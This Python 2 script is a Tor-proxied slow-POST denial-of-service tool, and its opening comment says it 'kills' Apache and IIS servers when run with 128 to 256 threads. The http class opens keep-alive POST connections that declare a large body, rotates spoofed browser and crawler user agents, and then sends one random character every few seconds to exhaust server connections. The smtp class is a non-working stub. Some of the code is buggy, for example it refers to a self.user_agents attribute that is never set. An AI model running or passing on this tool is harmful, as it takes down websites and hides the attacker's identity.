#!/usr/bin/python

# this assumes you have the socks.py (http://phiral.net/socks.py)
# and terminal.py (http://phiral.net/terminal.py) in the
# same directory and that you have tor running locally
# on port 9050. run with 128 to 256 threads to be effective.
# kills apache 1.X with ~128, apache 2.X / IIS with ~256
# not effective on nginx

import os
import re
import time
import sys
import signal
import random
import math
import getopt
import socks
import string
import terminal

from threading import Thread

global term

term = terminal.TerminalController()

class smtp(Thread):

    def __init__(self, host, port, tor):
        Thread.__init__(self)
        self.host = host
        self.port = port
        self.socks = socks.socksocket()
        self.tor = tor
        self.running = True
        user_agents = [
         "OperaMail/9.20 (Windows NT 6.0; U; en)",
        ]
        signal.signal(signal.SIGUSR1, self._handler)

    def _handler(signum, frame):
        print('Signal handler called with signal', signum)
        if signum == signal.SIGINT:
            self.running = False

    def _send(self, pause=10):
        raise NotImplementedError

        # self.socks.send("POST / HTTP/1.1\r\n"
        #                 "Host: %s\r\n"
        #                 "User-Agent: %s\r\n"
        #                 "Connection: keep-alive\r\n"
        #                 "Keep-Alive: 900\r\n"
        #                 "Content-Length: 10000\r\n"
        #                 "Content-Type: application/x-www-form-urlencoded\r\n\r\n" %
        #                 (self.host, random.choice(self.user_agents)))
        #
        # # slow post attachment
        # for i in range(0, 9999):
        #     if self.running is False
        #         break
        #     p = random.choice(string.letters+string.digits)
        #     print term.BOL+term.UP+term.CLEAR_EOL+"Posting: %s" % p+term.NORMAL
        #     self.socks.send(p)
        #     time.sleep(random.uniform(0.1, 3))
        #
        # self.socks.close()

    def run(self):
        while self.running:
            while self.running:
                try:
                    if self.tor:
                        self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
                    self.socks.connect((self.host, self.port))
                    print term.BOL+term.UP+term.CLEAR_EOL+"Connected to host..."+ term.NORMAL
                    break
                except Exception, e:
                    if e.args[0] == 106 or e.args[0] == 60:
                        break
                    print term.BOL+term.UP+term.CLEAR_EOL+"Error connecting to host..."+ term.NORMAL
                    time.sleep(1)
                    continue

            while self.running:
                try:
                    self._send()
                except Exception, e:
                    if e.args[0] == 32 or e.args[0] == 104:
                        print term.BOL+term.UP+term.CLEAR_EOL+"Thread broken, restarting..."+ term.NORMAL
                        self.socks = socks.socksocket()
                        break
                    time.sleep(0.1)
                    pass


class http(Thread):

    def __init__(self, host, port, tor):
        Thread.__init__(self)
        self.host = host
        self.port = port
        self.socks = socks.socksocket()
        self.tor = tor
        self.running = True
        user_agents = [
         "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.3)",
         "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
         "Googlebot/2.1 (http://www.googlebot.com/bot.html)",
         "Opera/9.20 (Windows NT 6.0; U; en)",
         "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
         "Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
         "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.1",
         "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)", # maybe not
         "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13"
         "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
         "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
         "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
         "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
         "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
         "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8",
         "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
         "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
         "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
        ]
        signal.signal(signal.SIGUSR1, self._handler)

    def _handler(signum, frame):
        print('Signal handler called with signal', signum)
        if signum == signal.SIGINT:
            self.running = False
            raise KeyboardInterrupt

    def _post(self, pause=10):

        self.socks.send("POST / HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "User-Agent: %s\r\n"
                        "Connection: keep-alive\r\n"
                        "Keep-Alive: 900\r\n"
                        "Content-Length: 10000\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n\r\n" %
                        (self.host, random.choice(self.user_agents)))

        for i in range(0, 9999):
            if self.running is False:
                break
            p = random.choice(string.letters+string.digits)
            print term.BOL+term.UP+term.CLEAR_EOL+"Posting: %s" % p+term.NORMAL
            self.socks.send(p)
            time.sleep(random.uniform(0.1, 3))

        self.socks.close()

    def run(self):
        while self.running:
            while self.running:
                try:
                    if self.tor:
                        self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
                    self.socks.connect((self.host, self.port))
                    print term.BOL+term.UP+term.CLEAR_EOL+"Connected to host..."+ term.NORMAL
                    break
                except Exception, e:
                    if e.args[0] == 106 or e.args[0] == 60:
                        break
                    print term.BOL+term.UP+term.CLEAR_EOL+"Error connecting to host..."+ term.NORMAL
                    time.sleep(1)
                    continue

            while self.running:
                try:
                    self._post()
                except Exception, e:
                    if e.args[0] == 32 or e.args[0] == 104:
                        print term.BOL+term.UP+term.CLEAR_EOL+"Thread broken, restarting..."+ term.NORMAL
                        self.socks = socks.socksocket()
                        break
                    time.sleep(0.1)
                    pass
